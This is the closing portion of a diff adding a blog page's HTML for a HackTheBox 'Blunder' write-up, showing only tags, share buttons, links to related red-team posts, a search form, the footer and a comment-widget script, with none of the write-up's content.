+      <a href="/tags/#bludit" class="page__taxonomy-item p-category" rel="tag">bludit</a><span class="sep">, </span>
+    
+      <a href="/tags/#gobuster" class="page__taxonomy-item p-category" rel="tag">gobuster,</a><span class="sep">, </span>
+    
+      <a href="/tags/#linux" class="page__taxonomy-item p-category" rel="tag">linux,</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2020-07-01T00:00:00+05:30">July 1, 2020</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://twitter.com/intent/tweet?text=HackTheBox+Blunder%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FBlunder%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FBlunder%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/hackthebox/Blunder/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/hackthebox/Cascade/" class="pagination--pager" title="HackTheBox Cascade">Previous</a>
+    
+    
+      <a href="/hackthebox/Tabby/" class="pagination--pager" title="HackTheBox Tabby">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/malleablec2.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/Malleable-c2-pro/" rel="permalink">Cobalt Strike Malleable C2 Profiles
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-25T00:00:00+05:30">December 25, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hide from blue team like a pro by using malleable c2 profiles.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/cs.webp" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/redirectors/" rel="permalink">Cobalt Strike Redirectors using Apache-SSL
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-19T00:00:00+05:30">December 19, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/RTIL.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/RED-TEAM-Infra/" rel="permalink">RED-TEAM Home-Lab Infra
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">How to Setup a Red-Teams infrastructure at Home
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/GOAD/goad-part3.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/goad/GOAD-p3/" rel="permalink">Game of Active Directory - Part 3 [Recon]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2025 <a href="https://dcodezero.github.io/">https://dcodezero.github.io/</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/hackthebox/Blunder/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/Blunder"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://dcode_zero.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+  </body>
+</html>
